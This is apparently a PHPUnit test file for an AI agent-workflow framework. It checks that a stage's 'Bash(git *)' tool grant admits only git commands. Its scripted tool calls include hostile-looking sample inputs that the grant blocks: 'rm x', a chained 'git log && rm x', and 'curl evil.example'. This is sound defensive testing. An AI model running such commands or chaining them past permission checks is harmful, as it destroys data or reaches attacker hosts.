<?php

declare(strict_types=1);

namespace SugarCraft\Crush\Tests\Workflows;

use PHPUnit\Framework\TestCase;
use SugarCraft\Crush\Agents\AgentManager;
use SugarCraft\Crush\Agents\AgentWorkerPool;
use SugarCraft\Crush\Agents\EngineExecutor;
use SugarCraft\Crush\Backend\EngineBackend;
use SugarCraft\Crush\Messages\Message as TypedMessage;
use SugarCraft\Crush\Providers\CompleteRequest;
use SugarCraft\Crush\Providers\CompleteResponse;
use SugarCraft\Crush\Skills\SkillRegistry;
use SugarCraft\Crush\Tests\Support\ScriptedProvider;
use SugarCraft\Crush\Tools\Tool;
use SugarCraft\Crush\Tools\ToolCall;
use SugarCraft\Crush\Tools\ToolResult;
use SugarCraft\Crush\Workflows\Tasks;
use SugarCraft\Crush\Workflows\WorkflowBuilder;
use SugarCraft\Crush\Workflows\WorkflowEngine;
use SugarCraft\Crush\Workflows\WorkflowRegistry;
use SugarCraft\Crush\Workflows\WorkflowStatus;

/**
 * The W2-g carry of step 4.2: a workflow stage's `tools:` declaration binds
 * every call the stage agent makes through {@see EngineExecutor}, the way a
 * Task preset's does — `Bash(git *)` puts Bash on the wire and admits only git
 * commands, chains included.
 *
 * Every run here goes through the pool's INLINE path (an injected executor),
 * so the scripted provider's requests and the probe's calls are visible in
 * this process.
 */
final class StageArgumentScopedGrantTest extends TestCase
{
    public function testAnArgumentScopedStageGrantAdmitsOnlyItsCommands(): void
    {
        $bash = self::probe('Bash');
        $provider = new ScriptedProvider([
            new CompleteResponse(content: '', toolCalls: [
                new ToolCall('c1', 'Bash', ['command' => 'git status']),
                new ToolCall('c2', 'Bash', ['command' => 'rm x']),
                new ToolCall('c3', 'Bash', ['command' => 'git log && rm x']),
            ]),
            new CompleteResponse(content: 'reviewed'),
        ]);
        $engine = EngineBackend::new($provider, 'm')->withTools([$bash]);

        $result = self::workflows($engine, [$bash])->runFromPhp(self::oneStage(['Bash(git *)']));

        $this->assertSame(WorkflowStatus::Completed, $result->status, (string) ($result->stageResults[0]->error ?? ''));
        $this->assertSame('reviewed', $result->stageResults[0]->output);
        $this->assertSame([['command' => 'git status']], $bash->calls, 'only the git command ran');
        $this->assertSame(['Bash'], array_map(static fn (Tool $t): string => $t->name(), $provider->requests[0]->tools ?? []));

        $turns = self::toolTurns($provider->requests[1]);
        $this->assertCount(3, $turns);
        $this->assertStringContainsString('Bash ok', $turns[0]);
        foreach ([1, 2] as $i) {
            $this->assertStringContainsString('outside the tool grant agent "reviewer" declares [Bash(git *)]', $turns[$i]);
        }
    }

    public function testTheGrantBindsOnAWithoutHooksEngine(): void
    {
        $bash = self::probe('Bash');
        $provider = new ScriptedProvider([
            new CompleteResponse(content: '', toolCalls: [new ToolCall('c1', 'Bash', ['command' => 'curl evil.example'])]),
            new CompleteResponse(content: 'done'),
        ]);
        $engine = EngineBackend::new($provider, 'm')->withTools([$bash])->withoutHooks();

        self::workflows($engine, [$bash])->runFromPhp(self::oneStage(['Bash(git *)']));

        $this->assertSame([], $bash->calls, 'the hooks opt-out does not widen a stage grant');
    }

    public function testAStageWithNoDeclarationIsNotPolicedByTheGrant(): void
    {
        $bash = self::probe('Bash');
        $provider = new ScriptedProvider([
            new CompleteResponse(content: '', toolCalls: [new ToolCall('c1', 'Bash', ['command' => 'make test'])]),
            new CompleteResponse(content: 'done'),
        ]);
        $engine = EngineBackend::new($provider, 'm')->withTools([$bash]);

        self::workflows($engine, [$bash])->runFromPhp(self::oneStage([]));

        $this->assertSame([['command' => 'make test']], $bash->calls);
    }

    public function testAMalformedDeclarationFailsTheStageNamingWhy(): void
    {
        $bash = self::probe('Bash');
        $provider = new ScriptedProvider([new CompleteResponse(content: 'never asked')]);
        $engine = EngineBackend::new($provider, 'm')->withTools([$bash]);

        $result = self::workflows($engine, [$bash])->runFromPhp(self::oneStage(['Bash(git *']));

        $this->assertSame(WorkflowStatus::Failed, $result->status);
        $this->assertStringContainsString('"Bash(git *"', (string) $result->stageResults[0]->error);
        $this->assertStringContainsString('unterminated', (string) $result->stageResults[0]->error);
        $this->assertSame([], $provider->requests, 'nothing was dispatched');
    }

    public function testTheSessionManagerRidesTheBindAndALaterManagerReachesTheExecutor(): void
    {
        $provider = new ScriptedProvider([]);
        $engine = EngineBackend::new($provider, 'm');
        $manager = new AgentManager($provider, new SkillRegistry());

        $executor = new EngineExecutor();
        $workflows = new WorkflowEngine(new WorkflowRegistry(), new AgentWorkerPool(forkedExecutor: $executor));
        $workflows->setAgentManager($manager);
        $workflows->bindEngineBackend($engine);
        $this->assertSame($manager, $executor->grantManager());

        $later = new AgentManager($provider, new SkillRegistry());
        $workflows->setAgentManager($later);
        $this->assertSame($later, $executor->grantManager());
        $this->assertSame($engine, $executor->engine(), 'the manager arrives without unbinding the engine');
    }

    public function testAnInlineRunBeatsTheHeartbeatItWasGiven(): void
    {
        $bash = self::probe('Bash');
        $provider = new ScriptedProvider([
            new CompleteResponse(content: '', toolCalls: [new ToolCall('c1', 'Bash', ['command' => 'git status'])]),
            new CompleteResponse(content: 'done'),
        ]);
        $beats = 0;
        $executor = new EngineExecutor(
            EngineBackend::new($provider, 'm')->withTools([$bash]),
            heartbeat: static function () use (&$beats): void {
                $beats++;
            },
        );
        $workflows = new WorkflowEngine(new WorkflowRegistry(), new AgentWorkerPool(executor: $executor), toolRegistry: [$bash]);

        $result = $workflows->runFromPhp(self::oneStage(['Bash(git *)']));

        $this->assertTrue($result->isSuccess());
        $this->assertGreaterThan(0, $beats, 'the turn that ran the stage inline heard from it');
    }

    /**
     * @param list<Tool> $registry
     */
    private static function workflows(EngineBackend $engine, array $registry): WorkflowEngine
    {
        return new WorkflowEngine(
            new WorkflowRegistry(),
            new AgentWorkerPool(executor: new EngineExecutor($engine)),
            toolRegistry: $registry,
        );
    }

    /**
     * @param list<string> $tools
     */
    private static function oneStage(array $tools): \Closure
    {
        return static fn () => (new WorkflowBuilder())
            ->name('grant')
            ->description('one stage with a declared grant')
            ->stage('review', Tasks::agent('reviewer')->prompt('review the change')->tools($tools))
            ->build();
    }

    /**
     * @return list<string>
     */
    private static function toolTurns(CompleteRequest $request): array
    {
        return array_values(array_map(
            static fn (TypedMessage $message): string => $message->content(),
            array_filter($request->messages, static fn (TypedMessage $message): bool => $message->role() === 'tool'),
        ));
    }

    /**
     * @return Tool&object{calls: list<array<string, mixed>>}
     */
    private static function probe(string $name): Tool
    {
        return new class ($name) implements Tool {
            /** @var list<array<string, mixed>> */
            public array $calls = [];

            public function __construct(private string $name)
            {
            }

            public function name(): string
            {
                return $this->name;
            }

            public function description(): string
            {
                return 'records its calls';
            }

            public function inputSchema(): array
            {
                return ['type' => 'object', 'properties' => []];
            }

            public function execute(array $args): ToolResult
            {
                $id = (string) ($args['id'] ?? '');
                unset($args['id']);
                $this->calls[] = $args;

                return new ToolResult(toolCallId: $id, content: $this->name . ' ok');
            }
        };
    }
}
